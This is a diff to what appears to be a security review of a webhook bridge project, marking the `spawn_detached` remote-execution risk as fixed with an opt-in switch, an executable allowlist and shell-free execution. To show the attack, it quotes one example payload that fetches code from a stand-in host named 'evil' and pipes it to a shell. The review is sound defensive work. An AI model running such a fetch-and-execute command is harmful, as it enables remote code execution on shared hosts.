@@ -37,6 +37,8 @@ DL-008 enforces `mode & 0o077 == 0` on the channel token — but the two **highe
 **Fix:** hoist the perms check into a shared `SecretFile::read` and apply to all three readers, fail-closed (HMAC → 500 `secret_perms_insecure`; token → command error). Extend `bridge:check` to warn on perms for all three.
 
 ### B-3. `spawn_detached` — make it opt-in + executable-allowlisted + shell-free (Security M2)
+> **✅ Addressed (2026-05-31): DL-011.** Opt-in (`BRIDGE_SPAWN_ENABLED`, default off — `HandlerRegistry` doesn't register it otherwise); `cmd[0]` must be in `BRIDGE_SPAWN_ALLOWLIST` (absolute paths); execution is shell-free (`proc_open` argv + `setsid -f`, no `/bin/sh`). cwd/env are proc_open params.
+
 `HandlerRegistry` registers `spawn_detached` unconditionally (`:28`); it runs `exec(setsid <argv> … &)`. The "cmd is operator-authored, not webhook data" guarantee is a **convention, not an invariant** — `docs/customization.md` invites custom classifiers, and the natural `ReactionTarget::make(handler:'spawn_detached', payload:$payload)` passthrough hands an attacker the argv. `escapeshellarg` stops metachar breakout but not *which program runs* (`cmd:["/bin/sh","-c","curl evil|sh"]`). Highest-blast-radius surface (RCE as install user on a shared box); over 5 years P(some operator wires a passthrough classifier) → 1.
 **Fix:** (1) don't register by default — explicit per-install opt-in; (2) `config('bridge.spawn_allowlist')` of absolute program paths, reject `cmd[0]` not in it; (3) drop the shell — `proc_open` with an argv array + `posix_setsid`, no `cd && env` shell string.
 
